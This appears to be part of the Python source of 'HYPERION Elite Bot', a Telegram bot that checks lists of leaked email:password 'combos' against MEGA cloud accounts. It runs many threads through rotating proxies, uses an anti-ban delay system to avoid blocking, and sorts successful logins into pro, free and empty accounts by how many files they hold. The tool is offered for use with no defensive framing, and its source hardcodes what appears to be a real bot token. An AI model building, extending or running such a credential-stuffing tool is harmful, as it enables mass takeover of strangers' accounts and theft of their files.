                    await status_msg.edit_text("✅ AI-tested proxies ready!\n🚀 Starting checker...")
            
            # Initialize job
            self.current_job = {
                'combo_list': combo_list,
                'chat_id': chat_id,
                'start_time': time.time(),
                'threads': threads,
                'rate_limit': rate_limit,
                'proxy_mode': proxy_mode
            }
            
            self.stats = {
                'total': len(combo_list),
                'checked': 0,
                'hits': 0,
                'fails': 0,
                'errors': 0,
                'start_time': time.time(),
                'rate': 0,
                'eta': 0
            }
            
            self.hits = []
            self.is_running = True
            
            # Create progress message
            initial_msg = f"""
🚀 **HYPERION ELITE CHECKING**

**Configuration:**
• Total Combos: {len(combo_list):,}
• Threads: {threads}
• Rate Limit: {rate_limit}s
• Proxy Mode: {proxy_mode or 'Direct'}
• Proxies: {len(self.current_proxies):,}

**Status:** Initializing...
**Progress:** 0 / {len(combo_list):,} (0.0%)
**Hits:** 0
**Rate:** 0/min
**ETA:** Calculating...

*This message will update with live progress*
            """
            
            self.progress_message = await self.send_message(chat_id, initial_msg)
            
            # Start checking in background thread
            check_thread = threading.Thread(target=self.run_elite_checking, daemon=True)
            check_thread.start()
            
            # Start progress update task
            asyncio.create_task(self.progress_update_loop())
            
            logger.info(f"✅ Elite checking initiated - Thread: {check_thread.name}")
            
        except Exception as e:
            logger.error(f"Error starting elite checking: {e}")
            await self.send_message(chat_id, f"❌ Failed to start checking: {str(e)}")
    
    def run_elite_checking(self):
        """Run elite checking job with real-time updates"""
        try:
            chat_id = self.current_job['chat_id']
            combo_list = self.current_job['combo_list']
            threads = self.current_job['threads']
            
            # Initialize CheckerEngine with elite settings
            try:
                self.checker_engine = CheckerEngine(thread_count=threads)
                logger.info(f"✅ CheckerEngine initialized with {threads} threads")
            except Exception as e:
                logger.error(f"❌ Failed to initialize CheckerEngine: {e}")
                raise
            
            # Configure proxies if available
            if self.current_proxies:
                proxy_list = [p['proxy'] if isinstance(p, dict) else p for p in self.current_proxies]
                # Enable anti-ban system with proxies
                self.anti_ban_system.enable(max_rpm=60, min_delay=1.0, max_delay=3.0)
                for proxy_str in proxy_list[:50]:  # Use top 50 proxies
                    try:
                        parts = proxy_str.split(':')
                        if len(parts) >= 2:
                            self.anti_ban_system.add_proxy(parts[0], int(parts[1]))
                    except:
                        continue
            
            # Setup elite callbacks
            def progress_callback(checked, total, hits, customs, fails, errors=0, 
                                pro_hits=0, free_hits=0, empty_hits=0, 
                                pro_low=0, pro_high=0, free_low=0, free_high=0):
                # Enhanced statistics tracking with detailed categorization
                self.stats.update({
                    'checked': checked,
                    'hits': hits,
                    'fails': fails,
                    'errors': errors,
                    'customs': customs,
                    'pro_hits': pro_hits,
                    'free_hits': free_hits,
                    'empty_hits': empty_hits,
                    'pro_low_files': pro_low,
                    'pro_high_files': pro_high,
                    'free_low_files': free_low,
                    'free_high_files': free_high
                })
                
                # Calculate advanced stats
                elapsed = time.time() - self.stats['start_time']
                if elapsed > 0:
                    self.stats['rate'] = (checked / elapsed) * 60  # per minute
                    remaining = total - checked
                    if self.stats['rate'] > 0:
                        self.stats['eta'] = (remaining / self.stats['rate']) * 60  # seconds
                
                # Enhanced progress logging every 10 checks
                if checked % 10 == 0:
                    logger.info(f"🚀 HYPERION Progress: {checked}/{total} ({checked/total*100:.1f}%) | "
                               f"✅ Hits: {hits} (Pro: {pro_hits}, Free: {free_hits}, Empty: {empty_hits}) | "
                               f"❌ Fails: {fails} | ⚠️ Errors: {errors}")
            
            def status_callback(message, level):
                if level == "hit":
                    self.hits.append(message)
                    logger.info(f"🎯 Hit found: {message}")
                    # Immediate hit notification (thread-safe)
                    try:
                        # Store the hit for later notification
                        # The progress update loop will handle notifications
                        pass
                    except Exception as e:
                        logger.error(f"Hit notification error: {e}")
            
            self.checker_engine.set_callbacks(progress_callback, status_callback)
            
            # Configure CheckerEngine
            hits_filename = f"elite_hits_{int(time.time())}.txt"
            self.checker_engine.set_configuration(
                keyword="",
                filename=hits_filename,
                discord_notifier=None,
                deep_check=True,
                start_position=0
            )
            
            logger.info(f"📁 Results will be saved to: {hits_filename}")
            
            # Prepare accounts (ensure correct format)
            accounts = []
            for item in combo_list:
                if isinstance(item, tuple) and len(item) == 2:
                    accounts.append(item)
                elif isinstance(item, str) and ':' in item:
                    email, password = item.split(':', 1)
                    accounts.append((email.strip(), password.strip()))
                else:
                    logger.warning(f"Invalid combo format: {item}")
            
            if not accounts:
                # Thread-safe message sending
                try:
                    import asyncio
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        loop.create_task(self.send_message(chat_id, "❌ No valid accounts to check. Please upload a proper combo file."))
                except Exception as e:
                    logger.error(f"Error sending no accounts message: {e}")
                return
            
            logger.info(f"🚀 Elite checking started: {len(accounts)} accounts, {threads} threads")
            
            # Start checking
            self.checker_engine.start_checking(accounts)
            
            # Monitor progress
            while self.checker_engine.running and self.is_running:
                time.sleep(1)
            
            # Completion (thread-safe)
            try:
                import threading
                if threading.current_thread().name != 'MainThread':
                    # Schedule in main event loop
                    asyncio.run_coroutine_threadsafe(
                        self.on_elite_completion(chat_id),
                        asyncio.get_event_loop()
                    )
                else:
                    asyncio.create_task(self.on_elite_completion(chat_id))
            except Exception as e:
                logger.error(f"Completion handler error: {e}")
            
        except Exception as e:
            logger.error(f"Elite checking error: {e}")
            try:
                import threading
                if threading.current_thread().name != 'MainThread':
                    asyncio.run_coroutine_threadsafe(
                        self.send_message(
                            self.current_job['chat_id'], 
                            f"❌ Elite checking failed: {str(e)}"
                        ),
                        asyncio.get_event_loop()
                    )
                else:
                    asyncio.create_task(self.send_message(
                        self.current_job['chat_id'], 
                        f"❌ Elite checking failed: {str(e)}"
                    ))
            except Exception as loop_error:
                logger.error(f"Error sending failure message: {loop_error}")
        finally:
            self.is_running = False
    
    async def update_progress_message(self):
        """Update progress message with live stats"""
        if not self.progress_message or not self.current_job:
            logger.debug("No progress message or job to update")
            return
        
        try:
            progress_pct = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            elapsed = time.time() - self.stats['start_time']
            
            # Progress bar
            bar_length = 20
            filled_length = int(bar_length * progress_pct / 100)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            # ETA formatting
            eta_str = "Calculating..."
            if self.stats.get('eta', 0) > 0:
                eta_minutes = int(self.stats['eta'] / 60)
                eta_seconds = int(self.stats['eta'] % 60)
                eta_str = f"{eta_minutes:02d}:{eta_seconds:02d}"
            
            # Proxy status
            proxy_status = "Direct"
            if self.current_proxies:
                if self.current_job.get('proxy_mode') == 'ai':
                    proxy_status = f"AI-Tested ({len(self.current_proxies)})"
                else:
                    proxy_status = f"Fast ({len(self.current_proxies)})"
            
            updated_msg = f"""
🚀 **HYPERION ELITE CHECKING**

**Progress:** {bar} {progress_pct:.1f}%
**Checked:** {self.stats['checked']:,} / {self.stats['total']:,}
**✅ Hits:** {self.stats['hits']:,}
**❌ Fails:** {self.stats['fails']:,}
**⚠️ Errors:** {self.stats.get('errors', 0):,}

**Performance:**
• Rate: {self.stats.get('rate', 0):.0f}/min
• Threads: {self.current_job.get('threads', 0)}
• Elapsed: {int(elapsed)}s
• ETA: {eta_str}

**Hit Categories:**
🎯 **Pro Accounts:** {self.stats.get('pro_hits', 0):,}
  ├─ < 5 files: {self.stats.get('pro_low_files', 0):,}
  └─ ≥ 5 files: {self.stats.get('pro_high_files', 0):,}
🆓 **Free Accounts:** {self.stats.get('free_hits', 0):,}
  ├─ < 5 files: {self.stats.get('free_low_files', 0):,}
  └─ ≥ 5 files: {self.stats.get('free_high_files', 0):,}
📭 **Empty:** {self.stats.get('empty_hits', 0):,}

**System:**
• Proxies: {proxy_status}
• Mode: Elite
• Status: Running 🟢

*Live updates every 10 checks*
            """
            
            # Update the progress message
            await self.progress_message.edit_text(updated_msg, parse_mode=ParseMode.MARKDOWN)
            logger.debug(f"Progress updated: {self.stats['checked']}/{self.stats['total']} ({progress_pct:.1f}%)")
            
        except Exception as e:
            logger.error(f"Error updating progress message: {e}")
            # Try to send a new message if editing fails
            try:
                if self.current_job:
                    chat_id = self.current_job['chat_id']
                    new_msg = await self.send_message(chat_id, f"📊 Progress: {self.stats['checked']:,}/{self.stats['total']:,} ({progress_pct:.1f}%) | Hits: {self.stats['hits']:,}")
                    if new_msg:
                        self.progress_message = new_msg
            except Exception as fallback_error:
                logger.error(f"Fallback progress update failed: {fallback_error}")
    
    async def progress_update_loop(self):
        """Background progress update loop"""
        last_update_count = 0
        
        while self.is_running and self.current_job:
            try:
                await asyncio.sleep(5)  # Update every 5 seconds
                
                # Only update if progress has changed
                if self.stats['checked'] != last_update_count:
                    await self.update_progress_message()
                    last_update_count = self.stats['checked']
                    
            except Exception as e:
                logger.error(f"Progress update loop error: {e}")
                await asyncio.sleep(5)  # Wait before retrying
        
        logger.info("Progress update loop ended")
    
    async def stop_checking(self):
        """Stop current checking job"""
        if self.is_running and self.checker_engine:
            self.is_running = False
            self.checker_engine.stop_requested = True
            logger.info("🛑 Elite checking stop requested")
        else:
            logger.info("ℹ️ No checking job is currently running")
    
    async def send_hit_notification(self, chat_id: int, hit_info: str):
        """Send enhanced hit notification with detailed account information"""
        try:
            # Parse hit_info to extract key details
            lines = hit_info.split('\n')
            
            # Enhanced hit notification with structured display
            hit_msg = f"""🎯 **ELITE HIT DISCOVERED!**

{hit_info}

📊 **Session Stats:**
• Total Hits: {self.stats['hits']}
• Progress: {self.stats['checked']:,}/{self.stats['total']:,}
• Success Rate: {(self.stats['hits']/self.stats['checked']*100) if self.stats['checked'] > 0 else 0:.1f}%

🚀 **HYPERION Elite Bot** - Premium Account Found!"""
            
            await self.send_message(chat_id, hit_msg, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            logger.error(f"Error sending enhanced hit notification: {e}")
    
    async def on_elite_completion(self, chat_id: int):
        """Handle elite checking completion"""
        try:
            elapsed = time.time() - self.stats['start_time']
            
            # Final progress update
            if self.progress_message:
                completion_msg = f"""
✅ **HYPERION ELITE CHECKING COMPLETE**

**Final Results:**
• **Total Processed:** {self.stats['checked']:,}
• **🎯 Hits Found:** {self.stats['hits']:,}
• **❌ Failed:** {self.stats['fails']:,}
• **⚠️ Errors:** {self.stats['errors']:,}

**Performance:**
• **Total Time:** {int(elapsed)}s ({elapsed/60:.1f}m)
• **Average Rate:** {self.stats['rate']:.0f}/min
• **Success Rate:** {(self.stats['hits']/max(self.stats['checked'],1)*100):.2f}%

**Elite Status:** Mission Complete 🎖️
                """
                await self.progress_message.edit_text(completion_msg, parse_mode=ParseMode.MARKDOWN)
            
            # Send results files
            if self.stats['hits'] > 0:
                await self.send_elite_results(chat_id)
            else:
                await self.send_message(chat_id, "📁 No hits found in this elite operation.")
            
        except Exception as e:
            logger.error(f"Error in elite completion: {e}")
        finally:
            self.is_running = False
            self.current_job = None
            self.progress_message = None
    
    async def send_elite_results(self, chat_id: int):
        """Send elite results with professional formatting"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            results_file = self.results_dir / f"hyperion_elite_hits_{timestamp}.txt"
            
            # Create detailed results file
            with open(results_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("HYPERION ELITE RESULTS\n")
                f.write("=" * 60 + "\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
                f.write(f"Total Hits: {self.stats['hits']}\n")
                f.write(f"Success Rate: {(self.stats['hits']/max(self.stats['checked'],1)*100):.2f}%\n")
                
                if self.current_job:
                    f.write(f"Threads Used: {self.current_job.get('threads', 'N/A')}\n")
                    f.write(f"Proxy Mode: {self.current_job.get('proxy_mode', 'Direct')}\n")
                
                f.write("=" * 60 + "\n\n")
                
                for i, hit in enumerate(self.hits, 1):
                    f.write(f"[{i:04d}] {hit}\n")
                
                f.write("\n" + "=" * 60 + "\n")
                f.write("End of HYPERION Elite Results\n")
                f.write("=" * 60 + "\n")
            
            # Send file
            with open(results_file, 'rb') as f:
                await self.telegram_app.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=results_file.name,
                    caption=f"""
🎯 **HYPERION ELITE RESULTS**

• **Hits:** {self.stats['hits']:,}
• **File:** {results_file.name}
• **Generated:** {datetime.now().strftime('%H:%M:%S')}

Elite operation complete! 🎖️
                    """,
                    parse_mode=ParseMode.MARKDOWN
                )
            
            logger.info(f"Elite results sent: {results_file}")
            
        except Exception as e:
            logger.error(f"Error sending elite results: {e}")
            await self.send_message(chat_id, f"❌ Error delivering results: {str(e)}")
    
    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Elite status command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        if self.is_running and self.current_job:
            elapsed = time.time() - self.stats['start_time']
            progress_pct = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            
            status_msg = f"""
📊 **HYPERION ELITE STATUS**

**Operation:** Running 🟢
**Progress:** {self.stats['checked']:,}/{self.stats['total']:,} ({progress_pct:.1f}%)
**Hits:** {self.stats['hits']:,}
**Rate:** {self.stats['rate']:.0f}/min
**Elapsed:** {int(elapsed)}s

**Configuration:**
• Threads: {self.current_job.get('threads', 'N/A')}
• Proxy Mode: {self.current_job.get('proxy_mode', 'Direct')}
• Active Proxies: {len(self.current_proxies)}

**System Status:** Elite Mode Active 🎖️
            """
        else:
            status_msg = """
📊 **HYPERION ELITE STATUS**

**Operation:** Idle 🟡
**Status:** Ready for elite operations
**Last Results:** Available via /results
**System:** Fully operational

Upload combo file and use /scan to begin!
            """
        
        await update.message.reply_text(status_msg, parse_mode=ParseMode.MARKDOWN)
    
    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Elite stop command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        if self.is_running:
            await self.stop_checking()
            await update.message.reply_text("⏹️ **Elite operation stopped by command**\n\nPartial results will be delivered shortly.", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ No operation is currently running.")
    
    async def cmd_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Elite results command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        try:
            results_files = list(self.results_dir.glob("hyperion_elite_hits_*.txt"))
            
            if not results_files:
                await update.message.reply_text("📁 No elite results found.")
                return
            
            # Get latest 3 files
            latest_files = sorted(results_files, key=lambda f: f.stat().st_mtime, reverse=True)[:3]
            
            results_msg = "📁 **Elite Results Archive**\n\n"
            
            for i, file in enumerate(latest_files, 1):
                file_time = datetime.fromtimestamp(file.stat().st_mtime)
                file_size = file.stat().st_size
                results_msg += f"**{i}.** {file.name}\n• Time: {file_time.strftime('%Y-%m-%d %H:%M')}\n• Size: {file_size:,} bytes\n\n"
            
            keyboard = []
            for i, file in enumerate(latest_files):
                keyboard.append([InlineKeyboardButton(f"📥 Download {file.name}", callback_data=f"download_{file.name}")])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(results_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error accessing results: {str(e)}")
    
    async def cmd_auth(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Authentication command (for initial setup)"""
        user_id = update.effective_user.id
        
        if self.authorized_user_id is None:
            self.authorized_user_id = user_id
            await update.message.reply_text(f"""
🔐 **Elite Authorization Complete**

Welcome to HYPERION Elite Bot!

**Your Access:**
• Personal ID: `{user_id}`
• Security Level: Elite
• Bot Access: Full

This bot is now restricted to your Telegram ID only.
Use /start to begin elite operations! 🎖️
            """, parse_mode=ParseMode.MARKDOWN)
        elif self.is_authorized(user_id):
            await update.message.reply_text("✅ You are already authorized for elite access.")
        else:
            await update.message.reply_text("❌ Access Denied. This bot is private.")
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Elite help command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        help_msg = """
🎯 **HYPERION ELITE BOT - Command Reference**

**🚀 Core Operations:**
• `/scan` - AI Core combo analysis
• `/check [options]` - Start elite checking
• `/status` - Real-time operation status
• `/stop` - Emergency stop
• `/results` - Access results archive

**🤖 AI Commands:**
• `/scan` - Deep combo analysis with quality scoring
• Analysis includes: format validation, duplicates, domains, passwords

**⚙️ Check Options:**
• `--threads N` - Set thread count (1-200)
• `--rate N` - Set rate limit in seconds (0.1-10.0)  
• `--proxy fast` - Use fast proxy mode
• `--proxy ai` - Use AI-tested proxies

**🌐 Proxy System:**
• `/proxies` - Manage intelligent proxy system
• Fast Mode: Rapid gathering (1000+ proxies)
• AI Mode: Quality tested & MEGA compatible

**📊 Examples:**
• `/check` - Default settings
• `/check --threads 100 --rate 1.5` - Custom performance
• `/check --proxy ai --threads 50` - AI proxies + custom threads

**🔒 Security:**
• Personal ID restricted
• Secure cloud operation  
• Private results delivery

**File Upload:**
Just send a .txt combo file to automatically process!

Elite operations at your command! 🎖️
        """
        
        await update.message.reply_text(help_msg, parse_mode=ParseMode.MARKDOWN)
    
    async def send_message(self, chat_id: int, text: str, parse_mode=ParseMode.MARKDOWN):
        """Send message via Telegram"""
        try:
            return await self.telegram_app.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode
            )
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return None
    
    async def run_elite_bot(self):
        """Run the elite bot"""
        logger.info("🚀 Starting HYPERION Elite Bot...")
        
        if await self.setup_telegram_bot():
            logger.info("🤖 Starting elite Telegram interface...")
            await self.telegram_app.initialize()
            await self.telegram_app.start()
            
            try:
                await self.telegram_app.updater.start_polling()
                logger.info("✅ HYPERION Elite Bot operational! Elite access ready.")
                
                # Keep running
                while True:
                    await asyncio.sleep(1)
                    
            except KeyboardInterrupt:
                logger.info("Elite bot shutdown requested")
            finally:
                await self.telegram_app.stop()
        else:
            logger.error("❌ Failed to setup elite bot")
            return False
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info(f"Elite bot received signal {signum}, shutting down...")
        if self.is_running:
            asyncio.create_task(self.stop_checking())
        sys.exit(0)

async def main():
    """Main function for elite bot"""
    print("""
🎯 HYPERION ELITE BOT v5.0
=========================

The Ultimate MEGA Checker Telegram Interface
Elite features, AI-powered, Private access

Starting elite operations...
    """)
    
    # Bot token
    telegram_token = "7090420579:AAEmOwaErySWXdgT7jyXybYmjbOMKFOy3pM"
    
    if not TELEGRAM_AVAILABLE:
        print("❌ Telegram libraries not installed!")
        print("Install with: pip install python-telegram-bot")
        return
    
    # Create and run elite bot
    bot = HyperionEliteBot(telegram_token)
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, bot.signal_handler)
    signal.signal(signal.SIGTERM, bot.signal_handler)
    
    try:
        await bot.run_elite_bot()
    except Exception as e:
        logger.error(f"Elite bot error: {e}")

if __name__ == "__main__":
    asyncio.run(main())